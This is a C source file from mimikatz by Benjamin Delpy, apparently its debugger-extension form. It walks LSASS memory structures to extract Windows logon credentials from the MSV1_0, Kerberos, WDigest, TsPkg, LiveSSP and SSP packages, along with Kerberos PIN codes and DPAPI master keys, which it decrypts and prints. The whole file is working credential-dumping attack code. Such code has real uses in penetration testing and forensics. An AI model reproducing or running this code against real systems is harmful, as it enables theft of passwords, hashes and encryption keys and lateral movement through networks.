/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_packages.h"

const ANSI_STRING PRIMARY_STRING = {7, 8, "Primary"}, CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_MSV1_0_CREDENTIALS credentials;
	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	ULONG_PTR pPrimary, pCreds = (ULONG_PTR) pCredentials;
	DWORD flags;

	while(pCreds)
	{
		if(ReadMemory(pCreds, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL))
		{
			pPrimary = (ULONG_PTR) credentials.PrimaryCredentials;
			while(pPrimary)
			{
				if(ReadMemory(pPrimary, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL))
				{
					if(kull_m_string_getDbgUnicodeString(&primaryCredentials.Credentials))
					{
						if(kull_m_string_getDbgUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary))
						{
							dprintf("\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
							else
								flags = 0;

							kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &primaryCredentials.Credentials, logId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL | flags);

							LocalFree(primaryCredentials.Primary.Buffer);
						}				
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else dprintf("n.e. (Lecture KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
				pPrimary = (ULONG_PTR) primaryCredentials.next;
			}
			pCreds = (ULONG_PTR) credentials.next;
		} else dprintf("n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)");
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_KERBEROS_LOGON_SESSION session;
	UNICODE_STRING pinCode;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier), logId))
	{
		if(ReadMemory(ptr, &session, sizeof(KIWI_KERBEROS_LOGON_SESSION), NULL))
		{
			kuhl_m_sekurlsa_genericCredsOutput(&session.credentials, logId, 0);
			if(session.pinCode)
				if(ReadMemory((ULONG_PTR) session.pinCode, &pinCode, sizeof(UNICODE_STRING), NULL))
					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, logId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN ULONG_PTR pLiveGlobalLogonSessionList, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_LIVESSP_LIST_ENTRY credentials;
	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(pLiveGlobalLogonSessionList, FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), logId))
	{
		if(ReadMemory(ptr, &credentials, sizeof(KIWI_LIVESSP_LIST_ENTRY), NULL))
			if(ptr = (ULONG_PTR) credentials.suppCreds)
				if(ReadMemory(ptr, &primaryCredential, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL), NULL))
					kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, logId, (NtBuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
	} else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN ULONG_PTR pTSGlobalCredTable, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_TS_CREDENTIAL credentials;
	KIWI_TS_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pTSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), logId))
	{
		if(ReadMemory(ptr, &credentials, sizeof(KIWI_TS_CREDENTIAL), NULL))
			if(ReadMemory((ULONG_PTR) credentials.pTsPrimary, &primaryCredential, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), NULL))
				kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, logId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN ULONG_PTR pl_LogSessList, IN PLUID logId, IN PVOID pCredentials)
{
	ULONG_PTR ptr;
	BYTE buffer[offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL)];
	if(ptr = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(pl_LogSessList, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId))
	{
		if(ReadMemory(ptr, buffer, sizeof(buffer), NULL))
			kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (buffer + offsetWDigestPrimary), logId, 0);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN ULONG_PTR pSspCredentialList, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	if(ReadMemory(pSspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pSspCredentialList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY), NULL))
			{
				if(RtlEqualLuid(logId, &mesCredentials.LogonId))
				{
					dprintf("\n\t [%08x]", monNb++);
					kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, logId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_masterkeys(IN ULONG_PTR pMasterKeyCacheList, IN PLUID logId, IN PVOID pCredentials)
{
	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	PBYTE buffer;

	if(ReadMemory(pMasterKeyCacheList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pMasterKeyCacheList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(KIWI_MASTERKEY_CACHE_ENTRY), NULL))
			{
				if(RtlEqualLuid(logId, &mesCredentials.LogonId))
				{
					dprintf("\n\t [%08x]\n\t * GUID :\t", monNb++);
					kull_m_string_displayGUID(&mesCredentials.KeyUid);
					dprintf("\n\t * Time :\t"); kull_m_string_displayFileTime(&mesCredentials.insertTime);

					if(buffer = (PBYTE) LocalAlloc(LPTR, mesCredentials.keySize))
					{						
						if(ReadMemory(ptr + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key), buffer, mesCredentials.keySize, NULL))
						{
							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer, mesCredentials.keySize);
							dprintf("\n\t * Key :\t"); kull_m_string_dprintf_hex(buffer, mesCredentials.keySize, 0);
						}
						LocalFree(buffer);
					}
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}